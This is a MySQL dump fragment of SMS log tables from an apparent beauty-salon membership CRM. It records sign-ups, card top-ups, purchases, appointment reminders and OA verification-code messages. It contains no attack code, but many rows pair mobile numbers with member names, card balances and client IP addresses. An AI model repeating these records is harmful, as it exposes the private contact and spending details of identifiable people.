INSERT INTO `xy_smsfs` VALUES ('84', '2015-07-06 09:17:15', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 09:27:09充次卡,次卡余额10,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('85', '2015-07-06 09:17:52', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 09:27:45次卡消费成功,次卡余额9,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Sale&a=jiciok');
INSERT INTO `xy_smsfs` VALUES ('86', '2015-07-06 09:26:01', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员徐敏预约了您，顾客将在2015-07-09 09:30:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '101.226.125.116', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('87', '2015-07-06 10:54:11', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员周文慧预约了您，顾客将在2015-07-07 11:30:00到店，请做好准备！ 美丽人身美容院海州店 退订回复TD', '101.226.125.14', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('88', '2015-07-06 13:29:13', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 13:39:04充值5100,卡余额:5100.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('89', '2015-07-06 13:32:10', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 13:42:04充次卡,次卡余额14,卡余额:4300.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('90', '2015-07-06 13:40:45', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:恭喜您于2015-07-06 13:50:36成为本店会员,级别:普通会员,卡号:18261332079,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('91', '2015-07-06 13:48:51', '成功', '1', '1', 'liuxing99', '18661255143', '【CRM】亲:恭喜您于2015-07-06 13:58:45成为本店会员,级别:普通会员,卡号:18661255143,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('92', '2015-07-06 14:00:27', '成功', '1', '1', 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 14:10:20充值5000,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('93', '2015-07-06 14:02:14', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 14:12:08商品消费475,卡余额:4525.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('94', '2015-07-06 14:10:51', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 14:20:45商品消费190,卡余额:4335.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('95', '2015-07-06 14:41:10', '成功', '1', '1', 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 14:50:59商品消费0,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('96', '2015-07-06 14:43:26', '成功', '1', '1', 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 14:53:20商品消费0,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('97', '2015-07-06 14:43:33', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 14:53:26商品消费0,卡余额:4335.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('98', '2015-07-06 14:49:33', '成功', '1', '1', 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 14:59:26充次卡,次卡余额0,卡余额:5000.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('99', '2015-07-06 14:52:23', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 15:02:16充次卡,次卡余额1,卡余额:4145.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('100', '2015-07-06 14:53:23', '成功', '1', '1', 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 15:03:17由银卡会员调整为普通会员 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('101', '2015-07-06 14:53:24', '成功', '1', '1', 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 15:03:18商品消费800,卡余额:4600.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('102', '2015-07-06 14:53:27', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-06 15:03:20充值2010,卡余额:6155.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('103', '2015-07-06 14:58:07', '成功', '1', '1', 'liuxing99', '18661255143', '【CRM】亲:您的卡号:18661255143于2015-07-06 15:08:01次卡消费成功,次卡余额0,卡余额:4600.00 美丽人身美容院东海店 退订回复TD', '117.92.43.67', '/mms/index.php?m=Home&c=Sale&a=jiciok');
INSERT INTO `xy_smsfs` VALUES ('104', '2015-07-06 14:59:28', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员王静预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '221.131.128.200', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('105', '2015-07-06 15:17:31', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 15:27:21次卡消费成功,次卡余额13,卡余额:4300.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Sale&a=jiciok');
INSERT INTO `xy_smsfs` VALUES ('106', '2015-07-07 10:14:45', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 10:24:40商品消费475,卡余额:5680.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('107', '2015-07-07 11:00:14', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:10:09充值10100,卡余额:15780.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('108', '2015-07-07 11:00:52', '成功', '1', '1', 'liuxing99', '15206209942', '【CRM】亲:恭喜您于2015-07-07 11:10:48成为本店会员,级别:普通会员,卡号:62284804025566,卡余额:2000.00 美丽人身美容院 退订回复TD', '106.111.121.123', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('109', '2015-07-07 11:01:11', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:11:05由普通会员调整为银卡会员 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('110', '2015-07-07 11:01:12', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:11:08商品消费1615,卡余额:14165.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('111', '2015-07-07 11:03:46', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:13:42充值11000,卡余额:25165.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('112', '2015-07-07 11:04:50', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-07 11:14:46商品消费1360,卡余额:23805.00 美丽人身美容院东海店 退订回复TD', '117.92.178.130', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('113', '2015-07-07 11:08:08', '成功', '1', '1', 'liuxing99', '15206209942', '【CRM】亲:您的卡号:62284804025566于2015-07-07 11:18:04商品消费475,卡余额:1525.00 美丽人身美容院东海店 退订回复TD', '106.111.121.123', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('114', '2015-07-07 17:36:27', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-07 17:46:21商品消费648,卡余额:3652.00 美丽人身美容院海州店 退订回复TD', '171.8.142.101', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('115', '2015-07-07 17:40:05', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:于2015-07-07 17:50:02消费撤单-648.00,卡余额:4300.00 美丽人身美容院海州店 退订回复TD', '171.8.142.101', '/mms/index.php?m=Home&c=Xiaofei&a=chedan');
INSERT INTO `xy_smsfs` VALUES ('116', '2015-07-08 09:13:20', '成功', '1', '1', 'liuxing99', '13800138000', '【CRM】亲:恭喜您于2015-07-08 09:23:18成为本店会员,级别:普通会员,卡号:13800138000,卡余额:0.00 美丽人身美容院海州店 退订回复TD', '106.46.226.29', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('117', '2015-07-08 09:14:59', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员陈丽预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院海州店 退订回复TD', '101.226.125.117', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('118', '2015-07-08 09:23:14', '成功', '1', '1', 'liuxing99', '13800138000', '【CRM】亲:您的卡号:13800138000于2015-07-08 09:33:11充次卡,次卡余额5,卡余额:0.00 美丽人身美容院海州店 退订回复TD', '106.46.226.29', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('119', '2015-07-08 09:46:09', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员陈明明预约了您，顾客将在2015-07-09 10:00:00到店，请做好准备！ 全部店铺 退订回复TD', '101.226.69.109', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('120', '2015-07-08 14:09:16', '成功', '1', '1', 'liuxing99', '18261332079', '【CRM】亲:您的卡号:18261332079于2015-07-08 14:19:14商品消费400,卡余额:23405.00 美丽人身美容院东海店 退订回复TD', '117.92.167.213', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('121', '2015-07-10 13:49:35', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员徐敏预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '101.226.125.116', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('122', '2015-07-10 13:54:30', '成功', '1', '1', 'liuxing99', '18705238063', '【CRM】亲:会员徐敏预约了您，顾客将在2015-07-13 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '101.226.125.116', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('123', '2015-07-10 13:54:54', '成功', '1', '1', 'liuxing99', '18705238063', '【CRM】亲:会员周文慧预约了您，顾客将在2015-07-11 10:00:00到店，请做好准备！ 美丽人身美容院海州店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('124', '2015-07-10 14:57:51', '成功', '1', '1', 'liuxing99', '13317920984', '【CRM】亲:恭喜您于2015-07-10 15:07:47成为本店会员,级别:普通会员,卡号:666666,卡余额:1000.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('125', '2015-07-10 14:58:31', '成功', '1', '1', 'liuxing99', '13317920984', '【CRM】亲:您的卡号:666666于2015-07-10 15:08:31充值1050,卡余额:2050.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('126', '2015-07-10 15:00:36', '成功', '1', '1', 'liuxing99', '13317920984', '【CRM】亲:您的卡号:666666于2015-07-10 15:10:36商品消费950,卡余额:1100.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('127', '2015-07-10 16:13:20', '成功', '1', '1', 'liuxing99', '13707207529', '【CRM】亲:恭喜您于2015-07-10 16:23:20成为本店会员,级别:普通会员,卡号:1377777,卡余额:500.00 美丽人身美容院东海店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('128', '2015-07-10 16:14:12', '成功', '1', '1', 'liuxing99', '13707207529', '【CRM】亲:您的卡号:1377777于2015-07-10 16:24:12充值1000,卡余额:1500.00 美丽人身美容院东海店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('129', '2015-07-10 16:15:20', '成功', '1', '1', 'liuxing99', '13707207529', '【CRM】亲:您的卡号:1377777于2015-07-10 16:25:20商品消费475,卡余额:1025.00 美丽人身美容院东海店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('130', '2015-07-10 16:19:54', '成功', '1', '1', 'liuxing99', '17717173134', '【CRM】亲:恭喜您于2015-07-10 16:29:55成为本店会员,级别:普通会员,卡号:8888,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('131', '2015-07-10 16:20:34', '成功', '1', '1', 'liuxing99', '17717173134', '【CRM】亲:您的卡号:8888于2015-07-10 16:30:34充值2100,卡余额:2100.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('132', '2015-07-10 16:21:00', '成功', '1', '1', 'liuxing99', '17717173134', '【CRM】亲:您的卡号:8888于2015-07-10 16:31:00商品消费475,卡余额:1625.00 美丽人身美容院东海店 退订回复TD', '114.237.202.182', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('133', '2015-07-10 18:13:20', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-10 18:23:20充值10,卡余额:4310.00 美丽人身美容院东海店 退订回复TD', '180.105.230.232', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('134', '2015-07-11 19:38:34', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('135', '2015-07-11 19:38:35', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('136', '2015-07-11 19:38:38', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('137', '2015-07-11 19:38:39', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('138', '2015-07-11 19:38:40', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('139', '2015-07-11 19:38:41', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('140', '2015-07-11 19:38:41', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('141', '2015-07-11 19:38:42', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('142', '2015-07-11 19:42:59', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-11 19:53:00商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.204.165', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('143', '2015-07-11 19:43:04', '成功', '1', '1', 'liuxing99', '13317920984', '【CRM】亲:您的卡号:666666于2015-07-11 19:53:05商品消费475,卡余额:625.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('144', '2015-07-11 19:48:57', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员陈高明预约了您，顾客将在 09:00:00到店，请做好准备！ 全部店铺 退订回复TD', '112.85.73.133', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('145', '2015-07-11 19:50:34', '成功', '1', '1', 'liuxing99', '15051188827', '【CRM】亲:恭喜您于2015-07-11 20:00:36成为本店会员,级别:普通会员,卡号:456456456,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('146', '2015-07-11 19:51:05', '成功', '1', '1', 'liuxing99', '15051188827', '【CRM】亲:您的卡号:456456456于2015-07-11 20:01:07充值2000,卡余额:2000.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('147', '2015-07-11 19:51:46', '成功', '1', '1', 'liuxing99', '15051188827', '【CRM】亲:您的卡号:456456456于2015-07-11 20:01:47商品消费475,卡余额:1525.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('148', '2015-07-11 19:53:56', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员陈高明预约了您，顾客将在 08:00:00到店，请做好准备！ 全部店铺 退订回复TD', '112.85.73.133', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('149', '2015-07-11 19:54:29', '成功', '1', '1', 'liuxing99', '15051188827', '【CRM】亲:您的卡号:456456456于2015-07-11 20:04:31商品消费475,卡余额:1050.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('150', '2015-07-11 20:03:29', '成功', '1', '1', 'liuxing99', '13317920984', '【CRM】亲:您的卡号:666666于2015-07-11 20:13:31商品消费190,卡余额:435.00 美丽人身美容院东海店 退订回复TD', '114.237.204.165', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('151', '2015-07-11 20:11:47', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-11 20:21:49商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.204.165', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('152', '2015-07-13 14:12:58', '成功', '1', '1', 'liuxing99', '15921072135', '【CRM】亲:恭喜您于2015-07-13 14:23:00成为本店会员,级别:普通会员,卡号:15921072135,卡余额:0.00 美丽人身美容院 退订回复TD', '180.127.92.251', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('153', '2015-07-13 14:32:01', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员韩淑鑫预约了您，顾客将在2015-07-14 08:00:00到店，请做好准备！ 美丽人身美容院 退订回复TD', '101.226.125.114', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('154', '2015-07-13 15:59:54', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-13 16:04:05商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('155', '2015-07-13 16:27:36', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-13 16:31:46商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('156', '2015-07-13 16:46:02', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-13 16:50:04商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('157', '2015-07-17 15:48:37', '成功', '1', '1', 'liuxing99', '15905120019', '【CRM】亲:恭喜您于2015-07-17 15:58:48成为本店会员,级别:铂金卡会员,卡号:80595,卡余额:10000.00 美丽人身美容院东海店 退订回复TD', '222.191.137.117', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('158', '2015-07-17 16:00:31', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:会员张玉龙预约了您，顾客将在2015-07-19 14:30:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '222.191.137.117', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('159', '2015-07-17 21:13:23', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-17 21:17:27商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('160', '2015-07-21 17:34:11', '成功', '1', '1', 'liuxing99', '15905120019', '【CRM】亲:恭喜您于2015-07-21 17:44:26成为本店会员,级别:普通会员,卡号:881531,卡余额:5000.00 无锡市惠山区美时美刻美容SPA会所 退订回复TD', '180.113.155.180', '/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('161', '2015-07-21 17:37:41', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:会员张三预约了您，顾客将在 20:00:00到店，请做好准备！ 无锡市惠山区美时美刻美容SPA会所 退订回复TD', '180.113.155.180', '/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('162', '2015-07-27 14:29:17', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-27 14:33:29商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('163', '2015-07-27 14:31:26', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的销售订单于2015-07-27 14:35:38发货 送达方式申通快递 注意查收 退订回复TD', '127.0.0.1', '/sdlk/index.php?m=Home&c=Chuku&a=shenhe');
INSERT INTO `xy_smsfs` VALUES ('164', '2015-07-27 14:35:07', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的销售订单于2015-07-27 14:39:15发货 送达方式申通快递2625232 注意查收 退订回复TD', '127.0.0.1', '/sdlk/index.php?m=Home&c=Chuku&a=shenhe');

-- ----------------------------
-- Table structure for `xy_smss`
-- ----------------------------
DROP TABLE IF EXISTS `xy_smss`;
CREATE TABLE `xy_smss` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `addtime` datetime NOT NULL,
  `content` varchar(200) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `jieguo` varchar(20) NOT NULL,
  `url` varchar(255) NOT NULL,
  `ip` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 COMMENT='短信记录';

-- ----------------------------
-- Records of xy_smss
-- ----------------------------
INSERT INTO `xy_smss` VALUES ('1', '0', '2015-05-19 19:54:34', 'OA系统验证码为12015200，24小时之内有效', '18951251872', '1', '失败', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('2', '0', '2015-05-19 19:55:40', 'OA系统验证码为12015200，24小时之内有效', '18951251872', '1', '失败', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('3', '0', '2015-05-19 19:56:51', 'OA系统验证码为12015200，24小时之内有效', '18951250018', '1', '?2015-05-19 19:52:50', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('4', '0', '2015-05-19 19:59:22', 'OA系统验证码为12015200，24小时之内有效', '18951250018', '1', '失败', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('5', '0', '2015-05-19 20:00:22', 'OA系统验证码为12015200，24小时之内有效', '13812349563', '1', '?0', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('6', '0', '2015-05-19 20:02:20', 'OA系统验证码为12015200，24小时之内有效', '18951251872', '1', 'msg', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('7', '0', '2015-05-19 20:03:04', 'OA系统验证码为12015200，24小时之内有效', '18951251872', '1', '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('8', '0', '2015-05-20 13:58:17', 'OA系统验证码为12015200，24小时之内有效', '18951251872', '1', '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('9', '0', '2015-05-24 17:58:09', 'OA系统验证码为12015200，24小时之内有效', '18951251872', '1', '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_smss` VALUES ('10', '0', '2015-05-31 22:05:02', 'OA系统验证码为12015200，24小时之内有效', '13812349563', '1', '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
